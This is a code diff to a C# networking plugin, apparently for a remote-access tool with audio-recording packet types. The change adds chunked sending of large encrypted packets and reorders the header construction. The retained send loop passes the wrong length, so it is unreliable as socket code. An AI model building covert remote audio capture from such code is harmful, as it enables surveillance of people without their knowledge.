@@ -2,6 +2,7 @@
 using PacketLib.Packet;
 using PacketLib.Utils;
 using System;
+using System.IO;
 using System.Net.Sockets;
 
 /* 
@@ -65,6 +66,7 @@ namespace Plugin
         public void EndConnect(IAsyncResult ar)
         {
             Connected = connectAsync.EndInvoke(ar);
+
             if (hasToExit)
             {
                 return;
@@ -147,6 +149,7 @@ namespace Plugin
         public void EndPacketRead(IAsyncResult ar)
         {
             IPacket packet = readPacketAsync.EndInvoke(ar);
+
             if (packet != null)
                 ParsePacket(packet);
         }
@@ -178,29 +181,47 @@ namespace Plugin
             try
             {
                 byte[] encryptedData = data.SerializePacket(this.key);
+            
+                int total = 0;
+
+                int size = encryptedData.Length;
+                int datalft = size;
+                byte[] header = new byte[5];
+                socket.Poll(-1, SelectMode.SelectWrite);
+
+                byte[] temp = BitConverter.GetBytes(size);
+
+                header[0] = temp[0];
+                header[1] = temp[1];
+                header[2] = temp[2];
+                header[3] = temp[3];
+                header[4] = (byte)data.packetType;
+
                 lock (socket)
                 {
-                    int total = 0;
-                    int size = encryptedData.Length;
-                    int datalft = size;
-                    byte[] header = new byte[5];
-                    socket.Poll(-1, SelectMode.SelectWrite);
-
-                    byte[] temp = BitConverter.GetBytes(size);
-
-                    header[0] = temp[0];
-                    header[1] = temp[1];
-                    header[2] = temp[2];
-                    header[3] = temp[3];
-                    header[4] = (byte)data.packetType;
-
                     int sent = socket.Send(header);
 
-                    while (total < size)
+                    if (size > 1000000)//1mb
                     {
-                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
-                        total += sent;
-                        datalft -= sent;
+                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
+                        {
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                            {
+                                socket.Send(chunk, 0, read, SocketFlags.None);
+                            }
+                        }
+                    }
+                    else
+                    {
+                        while (total < size)
+                        {
+                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
+                            total += sent;
+                            datalft -= sent;
+                        }
                     }
                 }
             }
@@ -213,6 +234,7 @@ namespace Plugin
         private void SendDataCompleted(IAsyncResult ar)
         {
             PacketType packetType = sendDataAsync.EndInvoke(ar);
+
             if (Connected)
             {
                 if (packetType == PacketType.AUDIO_GET_DEVICES || packetType == PacketType.AUDIO_RECORD_OFF)
